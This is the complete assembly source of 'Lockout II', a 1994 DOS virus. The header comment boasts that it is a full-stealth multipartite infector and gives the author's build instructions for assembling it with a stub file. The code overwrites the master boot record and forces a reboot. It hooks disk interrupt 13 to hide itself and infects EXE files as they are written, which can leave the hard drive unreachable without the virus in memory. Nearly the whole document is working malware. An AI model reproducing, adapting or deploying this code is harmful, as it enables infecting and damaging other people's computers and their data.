;              LOCKOUT - II Virus (c) 1994 by Stormbringer
;             FULL Stealth Multi-Partite EXE/MBR Infector!
;                         ALL THAT IN 331 BYTES!
;
;Lockout II, the sequel to the Lockout COM/MBR virus, is a fully stealth
;EXE/MBR infector.  When it is first run, it will infect the MBR and reboot.
;After that point, it will be invisible to the user.  It infects EXE files
;whenever they are written to the disk.  When an infected file is read from
;the disk, it removes itself from the file.  For this reason, the infected
;files can be disinfected simply by PKZIP'ing them while LOCKOUT II is in
;memory.  The hard drive cannot be accessed unless the virus is in memory,
;i.e. you booted from the hard drive.
;
;The idea for this virus came as kinda a cross between TridenT's CLUST
;virus (Stealth .EXE infector, alpha test version) and my own LOCKOUT virus 
;(semi-stealth .COM/MBR infector).
;
;This virus needs a stub file, as it must be started at either the
;FeedertoEXE label or the EXEEntryPoint label.  A 2 byte file consisting
;of jmp 15e will work if you use "copy /b stub.com+lock2.com virus.com".
;
;                                                �  Stormbringer        
;                                              ���������������������   
;                                                �                      


.model tiny
.radix 16
.code
        org 100
start:
                mbr_loc         equ     7c00    ;This is your initial IP
                mbr_offset      equ     7b00    ;Offset - Com Offset
                mem_offset      equ     -100    ;Offset of mem from COM 

setup_stack:
        mov     ax,cs
        cli
        mov     ss,ax                   ;SS:SP=0000:7C00
        mov     sp,mbr_loc
        sti
mem_res:
        sub     word ptr cs:[413],1
        mov     ax,word ptr cs:[413]            ;Reserve 1K memory
        mov     cl,6
        shl     ax,cl
        sub     ax,10
        mov     es,ax                           ;Get Segment
        mov     si,mbr_loc
        push    cs
        pop     ds
        mov     cx,100
        mov     di,cx
        repnz   movsw                           ;Copy virus to memory
        mov     ax,offset after_jump
        push    es
        push    ax
        retf                                    ;Jump to new copy

FeederToEXE:
        jmp     short EXEEntryPoint

after_jump:
        mov     ax,word ptr ds:[4c]
        mov     word ptr cs:[Int_13_IP],ax
        mov     ax,word ptr ds:[4e]                     ;Get int 13 vector
        mov     word ptr cs:[Int_13_CS],ax
        
        mov     ax,cs
        
        cli
        mov     bx,offset Int_13_Handler
        mov     word ptr ds:[4c],bx                     ;Hook Int 13
        mov     word ptr ds:[4e],ax
        sti

Load_Old_Sec:
        mov     bx,7c00
        push    ds                                      ;Load old MBR and
        pop     es                                      ;Partition Table
        mov     cx,8
        call    ReadSector
Jump_Old_Sec:
        db      0ea,0,7c,0,0                            ;Jump to Old MBR


EXEEntryPoint:
        push    cs cs
        pop     ds es

        call    getoffset
getoffset:
        pop     bp
        sub     bp,offset getoffset
       
        lea     bx,[end_prog+bp]
        mov     cl,1                    ;Read in MBR
        call    ReadSector

        mov     byte ptr ds:[bx+1fdh],'V' ;Mark as infected.

        mov     cl,8
        call    WriteSector             ;Save it on sector 8

        mov     byte ptr ds:[bp+2fdh],'V'
        mov     word ptr [bp+2fe],0aa55  ;Mark as an infected bootsector      
        
        lea     bx,[start+bp]
        mov     cl,1
        call    writesector             ;write virus over MBR
        

        db      0ea
        dw      0               ;Jmp FFFF:0000 - Cold reboot
        dw      0ffff


WriteSector:
        mov     ah,03
        jmp short DoSector
ReadSector:
        mov     ah,02
DoSector:
        mov     al,1
        mov     dx,80
        xor     ch,ch
        int     13
        ret
Int_13_Handler:

GoInt13:        
Int_13_Handler:
        cmp     dx,80
        jne     CheckIfEXE
        cmp     ah,03
        ja      CheckIfEXE          ;Is something trying to read virus?
        cmp     ah,2
        jb      CheckIfEXE
        cmp     cx,1
        jne     CheckIfEXE
Trying_To_Access_Infection:
        mov     cx,8                    ;Give 'em old sector
        jmp     short Go_Int_13
        
CheckIfEXE:
        cmp     ah,02     
        je      ISRead
        cmp     ah,03
        je      IsWrite

Go_Int_13:
db      0ea
Int_13_IP       dw      0
Int_13_CS       dw      0

IsRead:
        pushf
        call    dword ptr cs:[Int_13_IP]
        jc      DoneRead
        
        push    ax bx es ds si di
        push    cs
        pop     ds
        mov     si,100
        mov     di,bx
        add     di,30
        mov     cx,Int_13_Handler-start
        repz    cmpsb                    ;Check if infected
        jcxz    CoverInfection
        jmp     short DoneStealth
  CoverInfection:
        mov     word ptr es:[bx],'ZM'
        mov     di,bx
        add     di,30
        mov     cx,end_prog-start       ;Restore host
        xor     al,al
        repnz   stosb
DoneStealth:
        pop     di si ds es bx ax
  ReadGood:        
        clc
  DoneRead:
        retf    2
        
IsWrite:
        cmp     word ptr es:[bx],'ZM'
        jne     Go_Int_13
InfectEXE:
        cmp     word ptr es:[bx+04],80  ;is under 64k?
        jae     DoneInfectExe 
        push    ax bx cx es ds si di
        push    cs
        pop     ds
        add     bx,30
        mov     di,bx
        mov     cx,200-30
CheckIfZero:
        cmp     byte ptr es:[bx],0
        jnz     BadFile                 ;Check if infectable 
        inc     bx                      ;i.e. large set of zero's
        loop    CheckIfZero

        mov     word ptr es:[di-30],5cebh       ;add in jump
        mov     si,100
        mov     cx,end_prog-start               ;copy virus into file
        repnz   movsb
BadFile:
        pop     di si ds es cx bx ax
DoneInfectEXE:        
        jmp     Go_Int_13
end_prog:
end start
